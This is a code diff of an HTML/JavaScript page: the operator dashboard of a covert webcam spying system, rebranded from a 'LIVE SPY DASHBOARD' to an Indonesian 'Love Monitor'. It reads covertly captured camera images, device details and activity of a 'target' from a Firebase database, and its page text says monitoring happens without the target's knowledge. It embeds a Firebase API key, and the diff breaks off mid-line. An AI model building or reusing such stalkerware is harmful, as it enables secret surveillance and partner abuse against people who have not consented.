@@ -1,220 +1,336 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>🛡️ Game Analytics Dashboard</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💌 Love Monitor</title>
     <style>
-        :root {
-            --hacker-green: #00ff41;
-            --matrix-bg: #0a0a0a;
-            --red-alert: #ff003c;
-        }
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Courier New', monospace;
         }
+        
         body {
-            background: var(--matrix-bg);
-            color: var(--hacker-green);
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            color: #fff;
             min-height: 100vh;
-            padding: 20px;
-            overflow-x: hidden;
         }
-        .header {
-            text-align: center;
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
             padding: 20px;
-            border-bottom: 2px solid var(--hacker-green);
+        }
+        
+        header {
+            text-align: center;
+            padding: 30px 0;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
             margin-bottom: 30px;
-            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
-        .alert-banner {
-            background: var(--red-alert);
-            color: white;
-            padding: 10px;
-            text-align: center;
-            font-weight: bold;
-            animation: alertPulse 2s infinite;
-            margin-bottom: 20px;
-            border-radius: 5px;
+        
+        .logo {
+            font-size: 2.5rem;
+            color: #ff4081;
+            margin-bottom: 10px;
         }
-        @keyframes alertPulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
+        
+        .subtitle {
+            color: #aaa;
+            font-style: italic;
         }
-        .dashboard-grid {
+        
+        .dashboard {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 25px;
             margin-bottom: 30px;
         }
+        
         .card {
-            background: rgba(0, 255, 65, 0.05);
-            border: 1px solid rgba(0, 255, 65, 0.3);
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: transform 0.3s;
         }
-        .live-feed {
-            grid-column: span 2;
+        
+        .card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(255, 64, 129, 0.3);
         }
-        #spy-image {
+        
+        .card-title {
+            color: #ff4081;
+            margin-bottom: 20px;
+            font-size: 1.3rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .card-title i {
+            font-size: 1.2rem;
+        }
+        
+        .live-feed-container {
+            text-align: center;
+        }
+        
+        #love-image {
             width: 100%;
-            max-width: 800px;
-            border: 3px solid var(--red-alert);
+            max-width: 500px;
             border-radius: 10px;
-            margin: 15px 0;
-            background: black;
-            min-height: 400px;
+            border: 3px solid #ff4081;
+            margin: 15px auto;
+            display: block;
+            background: #000;
+            min-height: 300px;
         }
-        .status-indicator {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            margin-right: 10px;
-            animation: statusPulse 2s infinite;
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-top: 20px;
         }
-        .online { background: var(--hacker-green); }
-        .offline { background: gray; }
-        @keyframes statusPulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        .log-container {
-            background: rgba(0, 0, 0, 0.8);
-            border: 1px solid #444;
-            border-radius: 5px;
+        
+        .stat-item {
+            background: rgba(255, 255, 255, 0.08);
             padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: #ff4081;
+            display: block;
+        }
+        
+        .stat-label {
+            font-size: 0.9rem;
+            color: #aaa;
+        }
+        
+        .love-log {
             max-height: 300px;
             overflow-y: auto;
-            margin-top: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 15px;
         }
+        
         .log-entry {
-            padding: 8px;
-            border-bottom: 1px solid #333;
+            padding: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
             font-size: 0.9rem;
         }
-        .log-entry.new {
-            background: rgba(0, 255, 65, 0.1);
-            border-left: 3px solid var(--hacker-green);
+        
+        .log-entry:last-child {
+            border-bottom: none;
         }
+        
+        .log-time {
+            color: #ff4081;
+            font-size: 0.8rem;
+        }
+        
+        .log-message {
+            margin-top: 5px;
+        }
+        
         .controls {
             display: flex;
             gap: 10px;
-            margin: 20px 0;
+            margin-top: 20px;
             flex-wrap: wrap;
         }
+        
         .control-btn {
-            background: rgba(255, 0, 60, 0.2);
+            background: rgba(255, 64, 129, 0.2);
             color: white;
-            border: 1px solid var(--red-alert);
+            border: 1px solid #ff4081;
             padding: 10px 20px;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
             transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
+        
         .control-btn:hover {
-            background: var(--red-alert);
+            background: #ff4081;
             transform: translateY(-2px);
         }
-        .matrix-effect {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            opacity: 0.1;
-            z-index: -1;
+        
+        .emotion-display {
+            font-size: 1.5rem;
+            text-align: center;
+            margin: 15px 0;
+            color: #ffcc00;
+            min-height: 40px;
         }
-        .footer {
+        
+        .love-meter {
+            height: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        
+        .love-fill {
+            height: 100%;
+            background: linear-gradient(to right, #ff4081, #c779d0);
+            border-radius: 10px;
+            width: 50%;
+            transition: width 1s;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: pulse 2s infinite;
+        }
+        
+        .online {
+            background: #4CAF50;
+        }
+        
+        .offline {
+            background: #f44336;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        footer {
             text-align: center;
             margin-top: 40px;
             padding-top: 20px;
-            border-top: 1px solid #333;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
             color: #666;
-            font-size: 0.8rem;
+            font-size: 0.9rem;
         }
-        .blink {
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+        
+        .secret-note {
+            background: rgba(255, 64, 129, 0.1);
+            border-left: 3px solid #ff4081;
+            padding: 15px;
+            border-radius: 0 10px 10px 0;
+            margin-top: 20px;
+            font-size: 0.9rem;
         }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <div class="matrix-effect" id="matrixCanvas"></div>
-    
-    <div class="alert-banner">
-        ⚠️ ZING-ZANG SURVEILLANCE SYSTEM - LIVE MONITORING ⚠️
-    </div>
-    
-    <div class="header">
-        <h1>🛡️ <span class="blink">LIVE SPY DASHBOARD</span> 🛡️</h1>
-        <p>Real-time facial recognition feed</p>
-    </div>
-    
-    <div class="dashboard-grid">
-        <div class="card">
-            <h3>🎯 TARGET STATUS</h3>
-            <p><span class="status-indicator online" id="status-light"></span>
-               Status: <span id="target-status-text">MONITORING...</span></p>
-            <p>Last Capture: <span id="last-capture-time">--:--:--</span></p>
-            <p>Resolution: <span id="image-resolution">Unknown</span></p>
-            <p>FPS: <span id="fps-counter">0</span></p>
-        </div>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-heart"></i> Love Monitor <i class="fas fa-heart"></i>
+            </div>
+            <p class="subtitle">Memantau setiap detik kebahagiaan dan senyumannya</p>
+        </header>
         
-        <div class="card">
-            <h3>📊 SYSTEM INFO</h3>
-            <p>Total Captures: <span id="total-captures">0</span></p>
-            <p>Database: <span id="db-status">Connected</span></p>
-            <p>Uptime: <span id="uptime">00:00:00</span></p>
-            <p>Active Targets: <span id="active-targets">1</span></p>
-        </div>
-        
-        <div class="card live-feed">
-            <h3>📸 LIVE CAMERA FEED</h3>
-            <div style="text-align: center;">
-                <img id="spy-image" src="" alt="Live Feed" />
-                <p>Auto-refresh: <span id="refresh-rate">1.5s</span></p>
+        <div class="dashboard">
+            <div class="card">
+                <h2 class="card-title"><i class="fas fa-camera"></i> Live Senyuman</h2>
+                <div class="live-feed-container">
+                    <img id="love-image" src="" alt="Live Feed">
+                    <div class="emotion-display" id="emotion-display">
+                        Menunggu senyuman...
+                    </div>
+                    <div class="love-meter">
+                        <div class="love-fill" id="love-fill"></div>
+                    </div>
+                    <p>Tingkat Cinta: <span id="love-percent">50%</span></p>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2 class="card-title"><i class="fas fa-chart-line"></i> Statistik Cinta</h2>
+                <div class="stats-grid">
+                    <div class="stat-item">
+                        <span class="stat-value" id="total-moments">0</span>
+                        <span class="stat-label">Momen Terekam</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value" id="session-time">0</span>
+                        <span class="stat-label">Detik Bersama</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value" id="last-emotion">-</span>
+                        <span class="stat-label">Emosi Terakhir</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-value"><span class="status-indicator online"></span></span>
+                        <span class="stat-label">Status</span>
+                    </div>
+                </div>
+                
                 <div class="controls">
-                    <button class="control-btn" onclick="saveImage()">💾 SAVE IMAGE</button>
-                    <button class="control-btn" onclick="toggleRecording()">⏺️ RECORD VIDEO</button>
-                    <button class="control-btn" onclick="zoomIn()">🔍 ZOOM IN</button>
-                    <button class="control-btn" onclick="zoomOut()">🔎 ZOOM OUT</button>
+                    <button class="control-btn" onclick="saveCurrentImage()">
+                        <i class="fas fa-save"></i> Simpan Gambar
+                    </button>
+                    <button class="control-btn" onclick="refreshFeed()">
+                        <i class="fas fa-sync-alt"></i> Refresh
+                    </button>
+                </div>
+                
+                <div class="secret-note">
+                    <i class="fas fa-lock"></i> Sistem memantau aktifitas dengan aman tanpa sepengetahuan target.
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2 class="card-title"><i class="fas fa-history"></i> Log Kenangan</h2>
+                <div class="love-log" id="love-log">
+                    <!-- Log entries will appear here -->
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2 class="card-title"><i class="fas fa-user"></i> Info Target</h2>
+                <div id="target-info">
+                    <p><i class="fas fa-clock"></i> Terhubung: <span id="connected-time">--:--:--</span></p>
+                    <p><i class="fas fa-desktop"></i> Perangkat: <span id="device-info">Loading...</span></p>
+                    <p><i class="fas fa-map-marker-alt"></i> Lokasi: <span id="location-info">Tidak terlacak</span></p>
+                    <p><i class="fas fa-heartbeat"></i> Aktivitas: <span id="activity-status">Aktif</span></p>
+                </div>
+                
+                <h3 style="margin-top: 20px; color: #ff4081;">Momen Terbaru</h3>
+                <div id="recent-moments">
+                    <!-- Recent moments will appear here -->
                 </div>
             </div>
         </div>
         
-        <div class="card">
-            <h3>📝 LIVE LOGS</h3>
-            <div class="log-container" id="log-container">
-                <!-- Logs will appear here -->
-            </div>
-        </div>
-        
-        <div class="card">
-            <h3>📍 TARGET INFO</h3>
-            <div id="target-info">
-                Loading target information...
-            </div>
-        </div>
+        <footer>
+            <p><i class="fas fa-code-heart"></i> Love Monitor v2.0 - Untuk pengawasan penuh kasih sayang</p>
+            <p style="margin-top: 10px; color: #ff4081;">"Setiap senyuman adalah kenangan yang berharga"</p>
+        </footer>
     </div>
     
-    <div class="footer">
-        <p>🦹 ZING-ZANG Surveillance System v2.0 • Legal in ZING-ZANG Realm • All monitoring authorized</p>
-        <p class="blink">THIS IS A FUCKING SECURE CONNECTION 🔐</p>
-    </div>
-
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
     
     <script>
-        // CONFIG FIREBASE SAMA KAYA TARGET 🔥
+        // ================= FIREBASE CONFIG =================
         const firebaseConfig = {
             apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
             authDomain: "survei-f11a1.firebaseapp.com",
@@ -229,209 +345,65 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
         
-        let lastImageTime = 0;
-        let captureCount = 0;
-        let isRecording = false;
-        let startTime = Date.now();
-        let zoomLevel = 1;
+        // ================= MONITORING SYSTEM =================
+        let totalMoments = 0;
+        let lastUpdateTime = Date.now();
         
-        // Matrix effect
-        function initMatrixEffect() {
-            const canvas = document.getElementById('matrixCanvas');
-            const ctx = canvas.getContext('2d');
-            
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            
-            const chars = "01";
-            const charArray = chars.split("");
-            const drops = [];
-            
-            const fontSize = 14;
-            const columns = canvas.width / fontSize;
-            
-            for(let i = 0; i < columns; i++) {
-                drops[i] = Math.random() * canvas.height;
-            }
-            
-            function drawMatrix() {
-                ctx.fillStyle = "rgba(0, 0, 0, 0.04)";
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                
-                ctx.fillStyle = "#0F0";
-                ctx.font = `${fontSize}px monospace`;
-                
-                for(let i = 0; i < drops.length; i++) {
-                    const text = charArray[Math.floor(Math.random() * charArray.length)];
-                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                    
-                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                        drops[i] = 0;
-                    }
-                    drops[i]++;
-                }
-            }
-            
-            setInterval(drawMatrix, 35);
-        }
-        
-        // Monitor live captures
-        function startMonitoring() {
-            // Listen for new captures
-            database.ref('spy_system/captures').limitToLast(1).on('value', (snapshot) => {
+        function startLoveMonitoring() {
+            // Monitor love moments (images)
+            database.ref('love_diary/moments').limitToLast(1).on('value', (snapshot) => {
                 const data = snapshot.val();
                 if (data) {
                     const key = Object.keys(data)[0];
-                    const capture = data[key];
+                    const moment = data[key];
                     
                     // Update live feed
-                    document.getElementById('spy-image').src = capture.image;
-                    document.getElementById('last-capture-time').textContent = 
-                        new Date(capture.timestamp).toLocaleTimeString();
-                    document.getElementById('image-resolution').textContent = capture.size || 'Unknown';
+                    const loveImage = document.getElementById('love-image');
+                    loveImage.src = moment.image;
                     
-                    // Update counters
-                    captureCount++;
-                    document.getElementById('total-captures').textContent = captureCount;
+                    // Update emotion display
+                    const emotionDisplay = document.getElementById('emotion-display');
+                    emotionDisplay.textContent = `Emosi: ${moment.emotion || 'Bahagia'}`;
+                    emotionDisplay.style.color = getEmotionColor(moment.emotion);
                     
-                    // Update FPS counter
-                    const now = Date.now();
-                    if (lastImageTime > 0) {
-                        const fps = Math.round(1000 / (now - lastImageTime));
-                        document.getElementById('fps-counter').textContent = fps;
-                    }
-                    lastImageTime = now;
+                    // Update love meter
+                    const lovePercent = moment.loveLevel || 50;
+                    document.getElementById('love-percent').textContent = `${lovePercent}%`;
+                    document.getElementById('love-fill').style.width = `${lovePercent}%`;
                     
-                    // Update status
-                    document.getElementById('target-status-text').innerHTML = 
-                        `<span style="color:#00ff41">LIVE 🔴</span>`;
+                    // Update stats
+                    totalMoments++;
+                    document.getElementById('total-moments').textContent = totalMoments;
+                    document.getElementById('last-emotion').textContent = moment.emotion || '-';
                     
-                    // Add to logs
-                    addLog(`📸 Capture received: ${capture.size}`, 'image');
+                    // Update last update time
+                    lastUpdateTime = Date.now();
+                    const timeStr = new Date(moment.timestamp).toLocaleTimeString();
+                    document.getElementById('connected-time').textContent = timeStr;
+                    
+                    // Add to log
+                    addLoveLog(`❤️ Momen ${moment.emotion} terekam`, moment.timestamp);
+                    
+                    // Update recent moments
+                    updateRecentMoments();
                 }
             });
             
-            // Monitor targets
-            database.ref('spy_system/targets').limitToLast(5).on('value', (snapshot) => {
+            // Monitor connections
+            database.ref('love_diary/connections').limitToLast(5).on('value', (snapshot) => {
                 const data = snapshot.val();
                 if (data) {
-                    const targets = Object.values(data);
-                    const active = targets.filter(t => t.status === 'CONNECTED').length;
-                    document.getElementById('active-targets').textContent = active;
+                    const connections = Object.values(data);
+                    const latest = connections[connections.length - 1];
                     
-                    // Update target info
-                    const latest = targets[targets.length - 1];
                     if (latest) {
-                        document.getElementById('target-info').innerHTML = `
-                            <p>📱 Platform: ${latest.platform || 'Unknown'}</p>
-                            <p>🖥️ Screen: ${latest.screenRes || 'Unknown'}</p>
-                            <p>🔗 User Agent: ${latest.userAgent ? latest.userAgent.substring(0, 50) + '...' : 'Unknown'}</p>
-                            <p>⏰ Last Seen: ${new Date(latest.timestamp).toLocaleTimeString()}</p>
-                        `;
-                    }
-                }
-            });
-            
-            // Monitor analytics
-            database.ref('spy_system/analytics').limitToLast(10).on('value', (snapshot) => {
-                const data = snapshot.val();
-                if (data) {
-                    const analytics = Object.values(data);
-                    const latest = analytics[analytics.length - 1];
-                    if (latest) {
-                        addLog(`📊 Analytics: ${latest.timeSpent}s played`, 'analytics');
-                    }
-                }
-            });
-        }
-        
-        // Log system
-        function addLog(message, type = 'info') {
-            const container = document.getElementById('log-container');
-            const logEntry = document.createElement('div');
-            logEntry.className = `log-entry new`;
-            
-            const timestamp = new Date().toLocaleTimeString();
-            const icon = type === 'image' ? '📸' : type === 'analytics' ? '📊' : 'ℹ️';
-            
-            logEntry.innerHTML = `<strong>${timestamp}</strong> ${icon} ${message}`;
-            
-            container.prepend(logEntry);
-            
-            // Limit logs to 20 entries
-            const entries = container.getElementsByClassName('log-entry');
-            if (entries.length > 20) {
-                entries[entries.length - 1].remove();
-            }
-            
-            // Remove 'new' class after 3 seconds
-            setTimeout(() => {
-                logEntry.classList.remove('new');
-            }, 3000);
-        }
-        
-        // Control functions
-        function saveImage() {
-            const img = document.getElementById('spy-image').src;
-            if (img) {
-                const link = document.createElement('a');
-                link.href = img;
-                link.download = `spy-capture-${Date.now()}.jpg`;
-                link.click();
-                addLog('💾 Image saved to device', 'info');
-            }
-        }
-        
-        function toggleRecording() {
-            isRecording = !isRecording;
-            addLog(`⏺️ Recording ${isRecording ? 'STARTED' : 'STOPPED'}`, 'info');
-        }
-        
-        function zoomIn() {
-            zoomLevel += 0.2;
-            updateZoom();
-        }
-        
-        function zoomOut() {
-            zoomLevel = Math.max(0.5, zoomLevel - 0.2);
-            updateZoom();
-        }
-        
-        function updateZoom() {
-            const img = document.getElementById('spy-image');
-            img.style.transform = `scale(${zoomLevel})`;
-            addLog(`🔍 Zoom: ${zoomLevel.toFixed(1)}x`, 'info');
-        }
-        
-        // Uptime counter
-        function updateUptime() {
-            const elapsed = Date.now() - startTime;
-            const hours = Math.floor(elapsed / 3600000);
-            const minutes = Math.floor((elapsed % 3600000) / 60000);
-            const seconds = Math.floor((elapsed % 60000) / 1000);
-            
-            document.getElementById('uptime').textContent = 
-                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        }
-        
-        // Initialize everything
-        window.onload = function() {
-            initMatrixEffect();
-            startMonitoring();
-            setInterval(updateUptime, 1000);
-            
-            // Initial log
-            addLog('🟢 Surveillance system initialized', 'info');
-            addLog('🔗 Connected to Firebase database', 'info');
-            addLog('🎯 Waiting for target connection...', 'info');
-        };
-        
-        // Handle window resize for matrix effect
-        window.addEventListener('resize', function() {
-            const canvas = document.getElementById('matrixCanvas');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
-    </script>
-</body>
-    </html>
+                        document.getElementById('device-info').textContent = latest.device || 'Unknown';
+                        
+                        let activityText = 'Aktif';
+                        if (latest.event === 'LOVE_SESSION_ENDED') {
+                            activityText = 'Tidak aktif';
+                        }
+                        document.getElementById('activity-status').textContent = activityText;
+                        
+                        // Add connection log
+                        if (latest.event === 'LOVE_CAMERA_ACTIV
